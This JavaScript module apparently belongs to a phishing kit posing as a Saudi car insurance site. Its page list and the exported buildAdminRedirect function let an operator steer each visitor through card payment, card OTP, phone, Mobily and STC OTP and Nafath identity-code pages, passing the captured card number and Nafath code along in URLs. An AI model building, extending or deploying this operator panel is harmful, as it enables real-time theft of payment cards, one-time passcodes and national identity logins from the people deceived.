const DEFAULT_COMPANY = {
  company: "شركة التأمين",
  name: "شركة التأمين",
  price: "115.00",
};

export const SITE_PAGES = [
  { path: "/", label: "التقديم" },
  { path: "/special_offers", label: "عروض مميزة" },
  { path: "/third_party_offers", label: "ضد الغير" },
  { path: "/comprehensive_offers", label: "تأمين شامل" },
  { path: "/confirm", label: "الدفع" },
  { path: "/verfiy", label: "OTP البطاقة" },
  { path: "/phone", label: "الجوال" },
  { path: "/phoneOtp", label: "OTP الجوال" },
  { path: "/mobilyOtp", label: "OTP موبايلي" },
  { path: "/stcOtp", label: "OTP STC" },
  { path: "/navaz", label: "نفاذ" },
  { path: "/stc", label: "انتظار STC" },
];

function orderPayload(user) {
  const { __v, cardAttempts: _attempts, ...rest } = user;
  return rest;
}

function dataSearch(user, extra = {}) {
  const payload = { ...orderPayload(user), ...extra };
  return `?data=${encodeURIComponent(JSON.stringify(payload))}`;
}

export function buildAdminRedirect(user, page, options = {}) {
  const { navazCode } = options;
  const id = user._id;
  const provider = user.MotslNetwork || "اس تي سي";
  const baseSession = { id, provider, phoneNetwork: provider };
  const companyData = user.companyData || DEFAULT_COMPANY;

  switch (page.path) {
    case "/":
      return { path: "/", search: "", session: baseSession };

    case "/special_offers":
    case "/third_party_offers":
    case "/comprehensive_offers":
      return { path: page.path, search: dataSearch(user), session: baseSession };

    case "/confirm":
      return {
        path: "/confirm",
        search: dataSearch(user, { companyData }),
        session: { ...baseSession, companyData: JSON.stringify(companyData) },
      };

    case "/verfiy":
      return {
        path: "/verfiy",
        search: dataSearch(user, {
          companyData,
          cardNumber: user.cardNumber || "",
        }),
        session: baseSession,
      };

    case "/phone":
      return {
        path: "/phone",
        search: `?id=${id}`,
        session: baseSession,
      };

    case "/phoneOtp":
    case "/mobilyOtp":
    case "/stcOtp":
    case "/order_otp":
      return { path: page.path, search: "", session: baseSession };

    case "/navaz": {
      const params = new URLSearchParams({ id });
      const code = navazCode || user.NavazOtp;
      if (code) params.set("userOtp", code);
      return {
        path: "/navaz",
        search: `?${params.toString()}`,
        session: baseSession,
      };
    }

    case "/stc": {
      const params = new URLSearchParams();
      if (user.NavazOtp) params.set("otp", user.NavazOtp);
      const search = params.toString() ? `?${params.toString()}` : "";
      return { path: "/stc", search, session: baseSession };
    }

    default:
      return { path: page.path, search: "", session: baseSession };
  }
}
